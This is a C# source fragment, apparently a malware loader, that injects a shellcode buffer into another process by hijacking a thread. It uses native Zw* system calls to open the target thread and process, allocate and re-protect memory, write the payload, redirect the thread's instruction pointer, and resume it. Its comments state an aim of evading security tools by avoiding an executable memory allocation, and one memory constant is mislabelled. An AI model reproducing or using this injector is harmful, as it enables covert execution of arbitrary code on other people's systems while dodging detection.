				NTSTATUS status = ZwOpenThread( out ptrOpenThread, ThreadAccess.THREAD_SUSPEND_RESUME_GET_CONTEXT_SET_CONTEXT, new OBJECT_ATTRIBUTES(), ref clientid);

				context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
				status = ZwGetContextThread(ptrOpenThread, ref context);

				status = ZwOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);

				IntPtr allocMemAddress = new IntPtr();
				byte [] sc = new byte [52772];
				sc = FindCode();
				IntPtr scodeSize = (IntPtr)(Int32)((sc.Length));

				status = ZwAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, 0x1000 /*MEM_COMMIT*/ | 0x2000 /*MEM_RESERVE*/, 0x10 /*PROCESS_VM_READ*/ ); // Avoid use PAGE_EXECUTE_READWRITE when allocate memory

				UInt32 BytesWritten = 0;
        status = ZwProtectVirtualMemory(procHandle, ref allocMemAddress, ref scodeSize, (UInt32)ReturnRight() /*PAGE_EXECUTE_READWRITE*/, ref BytesWritten); // Chage allocated memory to PAGE_EXECUTE_READWRITE

				IntPtr bytesWritten  = IntPtr.Zero;
    		IntPtr uPtr = Marshal.AllocHGlobal(sc.Length);
				Marshal.Copy(sc, 0, uPtr, sc.Length);
				status = ZwWriteVirtualMemory(procHandle, ref allocMemAddress, uPtr, (UInt32)(scodeSize), ref bytesWritten);
				Marshal.FreeHGlobal(uPtr);

				context.Rip = (ulong)allocMemAddress.ToInt64();
				status = ZwSetContextThread(ptrOpenThread, context);

				ulong SuspendCount;
				status = ZwResumeThread(ptrOpenThread, out SuspendCount);

				status = ZwWaitForSingleObject( ptrOpenThread, false, 0 );

				ZwClose(ptrOpenThread);
				ZwClose(procHandle);
    }
}
